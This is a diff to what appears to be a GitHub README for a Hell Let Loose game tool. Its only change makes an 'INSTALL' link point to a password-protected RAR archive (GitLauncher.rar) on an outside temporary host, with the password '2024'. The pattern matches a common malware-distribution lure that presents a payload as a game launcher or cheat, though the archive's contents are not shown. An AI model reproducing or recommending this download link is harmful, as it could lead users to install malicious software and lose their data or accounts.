@@ -2,7 +2,7 @@
 
 ![262](https://github.com/Heeasudkf23/WeC-Hell-Let-Loose/assets/155105181/cdbc7c9b-28bc-4524-b50b-35fb91197a3b)
 
-# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋](boogi.ma/temp/GitLauncher.rar)
+# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋](https://boogi.ma/temp/GitLauncher.rar)
 
 # 🔐 𝐏𝐀𝐒𝐒: 2024
 
